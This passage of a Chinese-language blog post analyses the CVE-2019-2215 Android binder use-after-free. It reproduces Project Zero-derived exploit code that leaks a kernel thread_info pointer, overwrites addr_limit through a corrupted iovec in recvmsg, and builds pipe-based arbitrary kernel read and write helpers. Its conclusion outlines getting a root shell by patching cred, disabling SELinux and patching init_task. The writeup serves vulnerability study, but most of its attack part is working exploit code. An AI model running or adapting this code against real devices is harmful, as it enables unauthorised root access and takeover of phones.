<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">epoll_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{.</span><span class="n">events</span> <span class="o">=</span> <span class="n">EPOLLIN</span><span class="p">};</span>
<span class="k">struct</span> <span class="n">iovec</span> <span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_ARRAY_SZ</span><span class="p">];</span>
<span class="kt">char</span> <span class="n">leakBuff</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
<span class="kt">int</span> <span class="n">pipefd</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
<span class="kt">int</span> <span class="n">byteSent</span><span class="p">;</span>
<span class="kt">pid_t</span> <span class="n">pid</span><span class="p">;</span>

<span class="n">memset</span><span class="p">(</span><span class="n">iovec_array</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">iovec_array</span><span class="p">));</span>

<span class="k">if</span><span class="p">(</span><span class="n">epoll_ctl</span><span class="p">(</span><span class="n">epfd</span><span class="p">,</span> <span class="n">EPOLL_CTL_ADD</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">))</span>
    <span class="n">exitWithError</span><span class="p">(</span><span class="s">"EPOLL_CTL_ADD failed: %s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>

<span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">dummy_page</span><span class="p">;</span> <span class="c1">// mutex</span>
<span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="c1">// linked list next</span>
<span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xDEADBEEF</span><span class="p">;</span> <span class="c1">// linked list prev</span>
<span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="n">pipe</span><span class="p">(</span><span class="n">pipefd</span><span class="p">))</span>
    <span class="n">exitWithError</span><span class="p">(</span><span class="s">"Pipe failed: %s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>

<span class="k">if</span><span class="p">(</span><span class="n">fcntl</span><span class="p">(</span><span class="n">pipefd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">F_SETPIPE_SZ</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0x1000</span><span class="p">)</span>
    <span class="n">exitWithError</span><span class="p">(</span><span class="s">"F_SETPIPE_SZ failed: %s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>

<span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>

<span class="k">if</span><span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_PDEATHSIG</span><span class="p">,</span> <span class="n">SIGKILL</span><span class="p">);</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>

    <span class="n">epoll_ctl</span><span class="p">(</span><span class="n">epfd</span><span class="p">,</span> <span class="n">EPOLL_CTL_DEL</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">pipefd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">leakBuff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leakBuff</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leakBuff</span><span class="p">))</span>
        <span class="n">exitWithError</span><span class="p">(</span><span class="s">"[CHILD] Read failed: %s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>

    <span class="n">close</span><span class="p">(</span><span class="n">pipefd</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">BINDER_THREAD_EXIT</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">byteSent</span> <span class="o">=</span> <span class="n">writev</span><span class="p">(</span><span class="n">pipefd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">iovec_array</span><span class="p">,</span> <span class="n">IOVEC_ARRAY_SZ</span><span class="p">);</span>

<span class="k">if</span><span class="p">(</span><span class="n">byteSent</span> <span class="o">!=</span> <span class="mh">0x2000</span><span class="p">)</span>
    <span class="n">exitWithError</span><span class="p">(</span><span class="s">"[PARENT] Leak failed: writev returned %d, expected 0x2000."</span><span class="p">,</span> <span class="n">byteSent</span><span class="p">);</span>

<span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">pipefd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">leakBuff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leakBuff</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leakBuff</span><span class="p">))</span>
    <span class="n">exitWithError</span><span class="p">(</span><span class="s">"[PARENT] Read failed: %s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>

<span class="n">__android_log_print</span><span class="p">(</span><span class="n">ANDROID_LOG_INFO</span><span class="p">,</span> <span class="s">"EXPLOIT"</span><span class="p">,</span> <span class="s">"leak + 0xE8 = %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">leakBuff</span> <span class="o">+</span> <span class="mh">0xE8</span><span class="p">));</span>
<span class="n">thread_info</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">leakBuff</span> <span class="o">+</span> <span class="mh">0xE8</span><span class="p">);</span>
</pre></div>
<p>运行此应用程序时，我们将在logcat中获得类似于下面的信息：</p>
<div class="highlight"><pre><span></span>com.example.binderuaf I/EXPLOIT: leak + <span class="nv">0xE8</span> <span class="o">=</span> fffffffec88c5700
</pre></div>
<p>该指针指向当前的进程<code>thread_info</code>结构体。这个结构体有一个非常有用的成员，我们可以利用它来获取任意的读写原语。</p>
<h2 id="toc-10">建立任意读写原语</h2>
<h3 id="toc-11">突破限制</h3>
<p>因此，我们泄漏了一个有用的内核指针，现在呢？让我们看看<code>task_info</code>的前几个成员。</p>
<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">thread_info</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span>       <span class="n">flags</span><span class="p">;</span>      <span class="cm">/* low level flags */</span>
    <span class="n">mm_segment_t</span>        <span class="n">addr_limit</span><span class="p">;</span> <span class="cm">/* address limit */</span>
    <span class="k">struct</span> <span class="n">task_struct</span>  <span class="o">*</span><span class="n">task</span><span class="p">;</span>      <span class="cm">/* main task structure */</span>
    <span class="kt">int</span>         <span class="n">preempt_count</span><span class="p">;</span>      <span class="cm">/* 0 =&gt; preemptable, &lt;0 =&gt; bug */</span>
    <span class="kt">int</span>         <span class="n">cpu</span><span class="p">;</span>               <span class="cm">/* cpu */</span>
<span class="p">};</span>
</pre></div>
<p>这里比较有趣的一个成员是<code>addr_limit</code>。有一些非常重要的与安全有关的宏引用了该字段。让我们看看其中之一——<code>access_ok</code>。</p>
<div class="highlight"><pre><span></span><span class="cp">#define access_ok(type, addr, size) __range_ok(addr, size)</span>
</pre></div>
<p>从<code>__range_ok</code>的注释可得知它基本上等同于<code>(u65)addr + (u65)size &lt;= current-&gt;addr_limit</code>。在内核尝试访问用户提供的指针的任何地方，几乎都会使用此宏。它用于确保所提供的指针确实是一个用户态指针并防止人们在内核期望用户态指针的地方传递内核态指针。一旦<code>addr_limit</code>的限制被突破就可以自由地向期望用户态指针的地方传递内核态指针，且<code>access_ok</code>将永远不会失败。</p>
<h3 id="toc-12">获得可控制的写入原语</h3>
<p>我们已经演示了可以使用unlink读取和泄漏内核数据——但是如何修改呢？为了泄漏内核数据，我们将iovec结构体写入文件描述符中，并使用unlink覆写其中的一个结构体，以便read函数能泄漏数据。要覆写内核数据，我们可以采用另一种方法。通过使用iovec结构体调用recvmsg函数并以相同的方式对其进行覆写，我们可以使用write函数将写入的数据覆写到相继的iovec结构体上以获得任意写入。<br>
让我们看一下使用recvmsg函数覆盖UAF对象的iovec结构体。</p>
<div class="highlight"><pre><span></span><span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">dummy_page</span><span class="p">;</span> <span class="c1">// mutex</span>
<span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// linked list next</span>
<span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xDEADBEEF</span><span class="p">;</span> <span class="c1">// linked list prev</span>
<span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">;</span> <span class="c1">// iov_len of previous, then this element and next element</span>
<span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span> <span class="o">+</span> <span class="mi">2</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xBEEFDEAD</span><span class="p">;</span>
<span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span> <span class="o">+</span> <span class="mi">2</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
</pre></div>
<p>就像infoleak中的情况，unlink使用内核指针覆盖了<code>IOVEC_INDX_FOR_WQ</code>处的iovec的<code>iov_len</code>和<code>IOVEC_INDX_FOR_WQ+1</code>处的iovec的<code>iov_base</code>。这个内核指针不仅仅指向一些随机数据——如果我们再看一看KGDB的输出，我们会发现它指向<code>IOVEC_INDX_FOR_WQ</code>的iovec的<code>iov_len</code>(和前面一样)！<br>
<a id="img6" href="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/20191125162720-661f147c-0f5d-1.png"><img src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/20191125162720-661f147c-0f5d-1.png"></a><br>
一旦recvmsg函数达到此iovec，它将开始将我们通过write函数写入的数据复制到该指针中——这使我们可以将任意数据写入后面经过验证的iovec结构体中，也就是说可以将任何指针传递给下一个iovec的<code>iov_base</code>——从而实现了任意写。查看写入的数据，可以看到它确实与<code>IOVEC_INDX_FOR_WQ</code>处的<code>iov_len</code>以后的数据对齐。</p>
<div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">second_write_chunk</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
    <span class="mi">1</span><span class="p">,</span> <span class="cm">/* iov_len */</span>
    <span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="cm">/* iov_base (already used) */</span>
    <span class="mh">0x8</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">,</span> <span class="cm">/* iov_len (already used) */</span>
    <span class="n">current_ptr</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">,</span> <span class="cm">/* next iov_base (addr_limit) */</span>
    <span class="mi">8</span><span class="p">,</span> <span class="cm">/* next iov_len (sizeof(addr_limit)) */</span>
    <span class="mh">0xfffffffffffffffe</span> <span class="cm">/* value to write */</span>
<span class="p">};</span>
</pre></div>
<p>注：这里其实原来文章也没有说清楚，和之前一样，触发UAF/unlink破坏iovec结构之后iovec[10].iov_len和iovec[11].iov_base的值都是iovec[10].iov_len的地址，iovec[11].iov_len被设置成0x28，也就是说iovec[10].iov_len，iovec[11].iov_base，iovec[11].iov_len，iovec[12].iov_base和iovec[12].iovec_len会被覆写成<code>second_write_chunk</code>中的内容，iovec[12].iov_base被覆写成<code>addr_limit</code>，iovec[12].iov_len被覆写成<code>sizeof(addr_limit)</code>，然后<code>addr_limit</code>再被覆写成0xfffffffffffffffe。<br>
<a id="img7" href="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/20191126170138-5b01865a-102b-1.png"><img src="./2019 - CVE-2019-2215 - Android kernel binder vulnerability analysis_files/20191126170138-5b01865a-102b-1.png"></a><br>
现在就得到了修改父进程的<code>addr_limit</code>的代码。同样，从功能上讲，代码与Project Zero的代码相似，但是已清理并使用JNI函数。</p>
<div class="highlight"><pre><span></span><span class="cp">#define OFFSET_OF_ADDR_LIMIT 8</span>

<span class="k">struct</span> <span class="n">epoll_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{.</span><span class="n">events</span> <span class="o">=</span> <span class="n">EPOLLIN</span><span class="p">};</span>
<span class="k">struct</span> <span class="n">iovec</span> <span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_ARRAY_SZ</span><span class="p">];</span>
<span class="kt">int</span> <span class="n">iovec_corruption_payload_sz</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">sockfd</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
<span class="kt">int</span> <span class="n">byteSent</span><span class="p">;</span>
<span class="kt">pid_t</span> <span class="n">pid</span><span class="p">;</span>

<span class="n">memset</span><span class="p">(</span><span class="n">iovec_array</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">iovec_array</span><span class="p">));</span>

<span class="k">if</span><span class="p">(</span><span class="n">epoll_ctl</span><span class="p">(</span><span class="n">epfd</span><span class="p">,</span> <span class="n">EPOLL_CTL_ADD</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">))</span>
    <span class="n">exitWithError</span><span class="p">(</span><span class="s">"EPOLL_CTL_ADD failed: %s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">iovec_corruption_payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
        <span class="mi">1</span><span class="p">,</span>                  <span class="c1">// IOVEC_INDX_FOR_WQ -&gt; iov_len</span>
        <span class="mh">0xdeadbeef</span><span class="p">,</span>         <span class="c1">// IOVEC_INDX_FOR_WQ + 1 -&gt; iov_base</span>
        <span class="mh">0x8</span> <span class="o">+</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">),</span>   <span class="c1">// IOVEC_INDX_FOR_WQ + 1 -&gt; iov_len</span>
        <span class="n">thread_info</span> <span class="o">+</span> <span class="n">OFFSET_OF_ADDR_LIMIT</span><span class="p">,</span> <span class="c1">// Arb. Write location! IOVEC_INDEX_FOR_WQ + 2 -&gt; iov_base</span>
        <span class="mi">8</span><span class="p">,</span>                  <span class="c1">// Arb. Write size (only need a QWORD)! IOVEC_INDEX_FOR_WQ + 2 -&gt; iov_len</span>
        <span class="mh">0xfffffffffffffffe</span><span class="p">,</span> <span class="c1">// Arb. Write value! Smash it so we can write anywhere.</span>
<span class="p">};</span>

<span class="n">iovec_corruption_payload_sz</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">iovec_corruption_payload</span><span class="p">);</span>

<span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">dummy_page</span><span class="p">;</span> <span class="c1">// mutex</span>
<span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span><span class="p">].</span><span class="n">iov_len</span>  <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// only ask for one byte since we'll only write one byte - linked list next</span>
<span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xDEADBEEF</span><span class="p">;</span> <span class="c1">// linked list prev</span>
<span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">iov_len</span>  <span class="o">=</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">;</span>     <span class="c1">// length of previous iovec + this one + the next one</span>
<span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span> <span class="o">+</span> <span class="mi">2</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xBEEFDEAD</span><span class="p">;</span> <span class="c1">// will get smashed by iovec_corruption_payload</span>
<span class="n">iovec_array</span><span class="p">[</span><span class="n">IOVEC_INDX_FOR_WQ</span> <span class="o">+</span> <span class="mi">2</span><span class="p">].</span><span class="n">iov_len</span>  <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="n">socketpair</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">))</span>
    <span class="n">exitWithError</span><span class="p">(</span><span class="s">"Socket pair failed: %s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>

<span class="c1">// Preemptively satisfy the first iovec request</span>
<span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">sockfd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"X"</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">exitWithError</span><span class="p">(</span><span class="s">"Write 1 byte failed: %s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>

<span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>

<span class="k">if</span><span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_PDEATHSIG</span><span class="p">,</span> <span class="n">SIGKILL</span><span class="p">);</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>

    <span class="n">epoll_ctl</span><span class="p">(</span><span class="n">epfd</span><span class="p">,</span> <span class="n">EPOLL_CTL_DEL</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">);</span>

    <span class="n">byteSent</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">sockfd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">iovec_corruption_payload</span><span class="p">,</span> <span class="n">iovec_corruption_payload_sz</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">byteSent</span> <span class="o">!=</span> <span class="n">iovec_corruption_payload_sz</span><span class="p">)</span>
        <span class="n">exitWithError</span><span class="p">(</span><span class="s">"[CHILD] Write returned %d, expected %d."</span><span class="p">,</span> <span class="n">byteSent</span><span class="p">,</span> <span class="n">iovec_corruption_payload_sz</span><span class="p">);</span>

    <span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">BINDER_THREAD_EXIT</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

<span class="k">struct</span> <span class="n">msghdr</span> <span class="n">msg</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">msg_iov</span> <span class="o">=</span> <span class="n">iovec_array</span><span class="p">,</span>
        <span class="p">.</span><span class="n">msg_iovlen</span> <span class="o">=</span> <span class="n">IOVEC_ARRAY_SZ</span>
<span class="p">};</span>

<span class="n">recvmsg</span><span class="p">(</span><span class="n">sockfd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="n">MSG_WAITALL</span><span class="p">);</span>
</pre></div>
<h3 id="toc-13">任意读写辅助函数</h3>
<p>现在，这一进程地址限制已经被绕过，任意内核读写很简单，只要几个read和write系统调用。通过write将想要写入的数据写到管道，并在管道的另一端read一个内核地址，就可以将数据写入该内核地址。相反，通过write将数据从一个内核地址写入管道，然后在管道的另一端调用read，就可以从该内核地址读取数据。成功实现任意读写！</p>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="n">kernel_rw_pipe</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>

<span class="c1">//...</span>

<span class="k">if</span><span class="p">(</span><span class="n">pipe</span><span class="p">(</span><span class="n">kernel_rw_pipe</span><span class="p">))</span>
    <span class="n">exitWithError</span><span class="p">(</span><span class="s">"Kernel R/W Pipe failed: %s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>

<span class="c1">//...</span>

<span class="kt">void</span> <span class="nf">kernel_write</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kaddr</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mh">0x1000</span><span class="p">)</span>
        <span class="n">exitWithError</span><span class="p">(</span><span class="s">"Reads/writes over the size of a page results causes issues."</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">kernel_rw_pipe</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">data</span><span class="p">,</span> <span class="n">len</span><span class="p">)</span> <span class="o">!=</span> <span class="n">len</span><span class="p">)</span>
        <span class="n">exitWithError</span><span class="p">(</span><span class="s">"Failed to write data to kernel (write)!"</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">kernel_rw_pipe</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">kaddr</span><span class="p">,</span> <span class="n">len</span><span class="p">)</span> <span class="o">!=</span> <span class="n">len</span><span class="p">)</span>
        <span class="n">exitWithError</span><span class="p">(</span><span class="s">"Failed to write data to kernel (read)!"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">kernel_read</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kaddr</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mh">0x1000</span><span class="p">)</span>
        <span class="n">exitWithError</span><span class="p">(</span><span class="s">"Reads/writes over the size of a page results causes issues."</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">kernel_rw_pipe</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">kaddr</span><span class="p">,</span> <span class="n">len</span><span class="p">)</span> <span class="o">!=</span> <span class="n">len</span><span class="p">)</span>
        <span class="n">exitWithError</span><span class="p">(</span><span class="s">"Failed to read data from kernel (write)!"</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">kernel_rw_pipe</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">data</span><span class="p">,</span> <span class="n">len</span><span class="p">)</span> <span class="o">!=</span> <span class="n">len</span><span class="p">)</span>
        <span class="n">exitWithError</span><span class="p">(</span><span class="s">"Failed to read data from kernel (read)!"</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<h3 id="toc-14">注意事项</h3>
<p>某些设备(即使它们存在漏洞)可能会在writev调用中失败，因为它将返回0x1000而不是所需的0x2000。这通常是因为waitqueue的偏移量不正确，在这种情况下必须针对目标机器提取内核映像，并提取适当的偏移量(或对其进行暴力破解)。</p>
<h2 id="toc-15">结论</h2>
<p>一旦完成了内核的读写操作，基本上就结束了。修改cred之后就可以获得root shell。如果不是用的三星设备，则可以禁用SELinux并修补<code>init_task</code>以便在利用漏洞后启动的每个新进程均以完全特权自动启动。在三星设备上由于存在Knox我认为如果不做额外的工作不可能做到这一点。但是在大多数其他设备上这些应该不是问题。<br>
值得注意的是，Project Zero的EXP非常稳定。它很少会失败，而当它失败时通常只是返回错误而不是内核崩溃，因此只需要再次运行就可以了。对于像我这样设备具有OEM的人来说，这使其成为一种了不起的临时root方法。<br>
总体而言，我认为Jann Horn和Maddie Stone的这种利用策略非常新颖，我从中学到了很多东西。它为我提供了一种关于UAF的全新观点：如果无法从UAF对象本身获得有用的原语，可能也存在其它的方法。</p>
<h2 id="toc-16">参考资料/其它资源</h2>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942" target="_blank" title="Issue 1942: Android; Use-After-Free in Binder driver (Chromium Bug Tracker)">Issue 1942: Android; Use-After-Free in Binder driver (Chromium Bug Tracker)</a><br>
<a href="https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885" target="_blank" title="Project Zero Exploit">Project Zero Exploit</a><br>
<a href="https://groups.google.com/forum/#!msg/syzkaller-bugs/QyXdgUhAF50/g-FXVo1OAwAJ" target="_blank" title="Syzkaller kASAN report">Syzkaller kASAN report</a><br>
<a href="https://elixir.bootlin.com/linux/v4.4.177/source" target="_blank" title="Bootlin Linux kernel source browser">Bootlin Linux kernel source browser</a></p>
<h2 id="toc-17">感谢</h2>
<p>Jann Horn和Maddie Stone提供了本文引用的EXP代码。</p>

            </div>
            

            <div class="post-user-action" style="margin-top: 34px;">
                <span class="btn btn-default pull-right" id="mark" data-action="topic" data-pk="6853">
                    <span id="mark-text">点击收藏 </span><span class="i-seprator"> | </span><span id="mark-count">0</span>
                </span>
                
                    <span class="btn btn-default pull-right" id="follow_topic" data-pk="6853">
                     <span>关注</span><span class="i-seprator"> | </span><span id="follow-count">1</span>
                    </span>
                
                <div class="clearfix"></div>
            </div>
            
                <div class="related-section">
                    <div class="related-box">
                        
                            <span><a class="pull-left" href="https://xz.aliyun.com/t/6852" title="Android智能终端系统的安全加固（上）"><span class="related-label" style="padding: 3px 4px;margin-right: 3px;">上一篇：</span>Android智能终端系统的安全加...</a></span>
                        
                        
                            <span><a class="pull-left" href="https://xz.aliyun.com/t/6831" title="某OK 5.3 最新版前台无限制注入（二）"><span class="related-label" style="">下一篇：</span>某OK 5.3 最新版前台无限制注...</a></span>
                        
                    </div>
                </div>
            
        </div>
    </div>
</div>

    <!-- topic & appendix -->
    



<div class="row box">
    <ol class="breadcrumb">
        <li class="active">0 条回复</li>
    </ol>
    <div class="box-container post-container">
        
            <ul>
                <li style="min-height: 50px;line-height: 60px;margin-left: 15px"><strong>动动手指，沙发就是你的了！</strong></li>
            </ul>
        
    </div>
</div>


    <!-- posts of topic -->
    
        <div class="row box" id="reply-box">
            
            <div class="box-container clearfix">
                
                    <div class="reminder">
                        <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F6853&amp;from_type=xianzhi"><strong>登录</strong></a> 后跟帖
                    </div>
                
            </div>
        </div>
    
    <!-- editor for post -->
    

        </div>
        <div class="span3 pull-right offset sidebar">
            


    <div class="box">
        <div class="info-panel">
